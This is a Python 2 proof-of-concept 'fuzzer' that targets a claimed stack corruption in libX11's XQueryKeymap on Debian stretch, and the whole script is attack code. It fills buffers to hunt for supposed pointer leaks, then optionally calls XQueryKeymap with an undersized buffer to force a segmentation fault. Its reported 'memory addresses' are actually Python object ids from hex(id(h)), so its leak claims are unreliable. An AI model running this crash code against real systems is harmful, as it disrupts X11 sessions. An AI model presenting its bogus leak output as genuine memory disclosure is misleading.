#!/usr/bin/python
#
# X11 (XQueryKeymap) Stack corruption (Possible Access violation) (Fuzzer)
#
# Vulnerable (tested) library: libx11-6 / Version: 2:1.6.4-3                   
# Debian package: libx11-6_1.6.4-3_amd64.deb (8ad41adbd147ffe4bf64c50efcac497b) 
# Tested at: Intel/x86_64 - Debian 4.9.25-1 (stretch)                          
#
# 0day: 03/06/2017 - by psy (epsylon@riseup.net) 
#
import sys
from ctypes import cast
import ctypes as ct
from ctypes.util import find_library
x11 = ct.cdll.LoadLibrary(find_library("X11"))
print ""
print "#################################################################################"
print "# X11/libX11.so.6 (XQueryKeymap) Stack corruption/Access violation <-> Fuzzer   #"
print "#------------------------------------------------------------------------------##"
print "# Vulnerable (tested) library: libx11-6 / Version: 2:1.6.4-3                    #"
print "# Debian package: libx11-6_1.6.4-3_amd64.deb (8ad41adbd147ffe4bf64c50efcac497b) #"
print "# Tested at: Intel/x86_64 - Debian 4.9.25-1 (stretch)                           #"
print "#------------------------------------------------------------------------------##"
print "# 0day: 03/06/2017 - by psy (epsylon@riseup.net)                                #"
print "#################################################################################"
print "\n-X11:", x11
display = x11.XOpenDisplay(None)
print "-Display:", display
num = raw_input("\n[?] Enter fuzzing factor (ex: 256): ")
if num == "":
    num = 256
try: 
    num = int(num)
except:
    print "\n[Error] Not a valid fuzzing factor. Aborting...\n"
    sys.exit(2)
dumped_map = []
address_list = []
print "\n[+] Fuzzing until: " + str(num) + "\n"
for i in range(num+1):
    keyboard = (ct.c_char * i)()
    keyboard.value = "A" * i
    keyboard_ptr = cast(keyboard, ct.c_char_p)
    if keyboard.value is not keyboard_ptr.value:
        print "Num chars:", str(i), "\n"
        print " - Buffer:", keyboard.raw
        print " - PTR cast:", keyboard_ptr.value
        print " - Keyboard Map:", keyboard_ptr.value.split(keyboard.value)
        print " - PTR LEAK:", keyboard_ptr.value.split(keyboard.value)[1]
        ptr_leak = keyboard_ptr.value.split(keyboard.value)[1]
        import struct
        try:
            h = struct.unpack("hh", ptr_leak) # little endian
            print "\n [!] struct.unpack PTR is:", h
            a = hex(id(h))
            print " [!] Memory address FOUND! -----> ", a, "\n"
            address_list.append(a)
        except:
            pass
        dumped_map.append(str(i)+"="+str(keyboard_ptr.value.split(keyboard.value)[1]))
        print "----"
skip = raw_input("\n[?] Wanna skip map resume? (Y/n): ")
if not skip:
    skip = "y"
if skip is not "y":
    print "\n[+] Dumping map:\n\n", dumped_map
    try:
        f = open('dumped_map.out', 'w')
        for d in dumped_map:
            f.write(str(dumped_map))
        f.close()
        print "\n[!] Saved at file: dumped_map.out"
    except:
        pass
print "\n-XQueryKeyMap:", x11.XQueryKeymap
if address_list:
    print "\n[!] Memory addresses found:\n"
    for a in address_list:
        print " -", a
sf = raw_input("\n[?] Wanna try to generate a segmentation fault (core dumped) -> THIS WILL STOP THIS TOOL? (N/y): ")
if not sf:
    sf = "n"
if sf is not "n":
    print "\n[!] Calling to function: x11.XQueryKeymap\n"
    keyboard = (ct.c_char * num)()
    x11.XQueryKeymap(display, keyboard)
else:
    print "\nBye!\n"
